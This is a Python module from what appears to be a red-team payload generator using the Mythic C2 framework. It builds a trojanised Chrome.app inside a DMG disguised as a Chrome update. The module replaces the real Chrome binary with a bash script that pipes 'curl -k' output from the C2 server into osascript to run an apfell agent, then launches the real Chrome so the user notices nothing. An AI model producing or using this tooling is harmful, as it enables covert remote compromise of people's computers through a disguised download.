### Resources
#https://arunpatwardhan.com/2019/01/04/creating-your-own-drag-and-drop-dmg/
#https://www.fcvl.net/vulnerabilities/macosx-gatekeeper-bypass
#https://asmaloney.com/2013/07/howto/packaging-a-mac-os-x-application-using-a-dmg/
#https://www.recitalsoftware.com/blogs/148-howto-build-a-dmg-file-from-the-command-line-on-mac-os-x

### This method relies on https://github.com/al45tair/dmgbuild but can build a basic one doing:
#1) hdiutil create /tmp/tmp.dmg -ov -volname "TestDMG" -fs HFS+ -srcfolder "/Users/itsatrap/Desktop/Test/"
#2) hdiutil convert /tmp/tmp.dmg -format UDZO -o TestDMG.dmg
# I used dmgbuild because I like simple pretty graphics :)

import shutil, errno, os
from mythic import *
from sys import exit
from os import system
import dmgbuild
from Settings.MythicSettings import *

def dmg():
    temp = "./Templates/DMG/"
    payload = "./Payloads/DMG_Payload" 
    print("!!! This module currently assumes Chrome is installed in /Applications on the build machine")   

    def copyanything(src, dst):
        try:
            shutil.copytree(src, dst)
            print("[+] Copied Template Folder to '% s'" % payload)
        except OSError as error:
        	shutil.rmtree(dst)
        	shutil.copytree(src, dst)
        	print("[+] Overwrote files '%s'" % payload)
    copyanything(temp,payload)    

    ## Create apfell payload
    async def scripting():
        mythic = mythic_rest.Mythic(
            username=mythic_username,
            password=mythic_password,
            server_ip=mythic_server_ip,
            server_port=mythic_server_port,
            ssl=mythic_ssl,
            global_timeout=-1,
        )
        print("[+] Logging into Mythic")
        await mythic.login()
        await mythic.set_or_create_apitoken()
        # define what our payload should be
        p = mythic_rest.Payload(
            payload_type="apfell", 
            c2_profiles={
                "http":[
                        {"name": "callback_host", "value": mythic_http_callback_host},
                        {"name": "callback_interval", "value": mythic_http_callback_interval},
                        {"name": "callback_port", "value": mythic_http_callback_port}
                    ]
                },
            tag="Disk Image",
            selected_os="macOS",
            # if we want to only include specific commands, put them here:
            #commands=["cmd1", "cmd2", "cmd3"],
            filename="Disk_Image.js")
        print("[+] Creating new apfell payload")
        # create the payload and include all commands
        # if we define commands in the payload definition, then remove the all_commands=True piece
        resp = await mythic.create_payload(p, all_commands=True, wait_for_build=True)

        print("[*] Building DMG Package Payload")
        payloadDownloadid = resp.response.file["agent_file_id"]

        url = "https://" + mythic_server_ip + ":" + mythic_server_port + "/api/v1.4/files/download/" + payloadDownloadid
        copyanything("/Applications/Google Chrome.app" , payload + "/Chrome.app") 
        shutil.copyfile(payload + "/Chrome.app/Contents/MacOS/Google Chrome" , payload + "/Chrome.app/Contents/MacOS/helper")
        os.system("chmod +x ./Payloads/DMG_Payload/Chrome.app/Contents/MacOS/helper")
       
        chromefile = open(payload + "/Chrome.app/Contents/MacOS/Google Chrome", 'w')
        chromefile.write('#!/bin/bash\n')
        chromefile.write("curl -k %s | osascript -l JavaScript &"%url)
        chromefile.write("\n")
        chromefile.write('bash ./helper\n')
    
    async def main():
        await scripting()
        os.chdir(payload)
        dmgbuild.build_dmg('chrome.dmg', 'Chrome App', 'settings.json')
        print("[+] Built Disk Image as Chrome.dmg")
        print("Notes: \n"
              "1) The created dmg file acts best as an update to a legitimate app (Chrome by default) \n"
              "2) Payload execution does not occur until the user runs the application (not just installation)")
        try:
            while True:
                pending = mythic_rest.asyncio.all_tasks()
                plist = []
                for p in pending:
                    if p._coro.__name__ != "main" and p._state == "PENDING":
                        plist.append(p)
                if len(plist) == 0:
                    exit(0)
                else:
                    await mythic_rest.asyncio.gather(*plist)
        except KeyboardInterrupt:
            pending = mythic_rest.asyncio.all_tasks()
            for t in pending:
                t.cancel()    

    loop = mythic_rest.asyncio.get_event_loop()
    loop.run_until_complete(main())
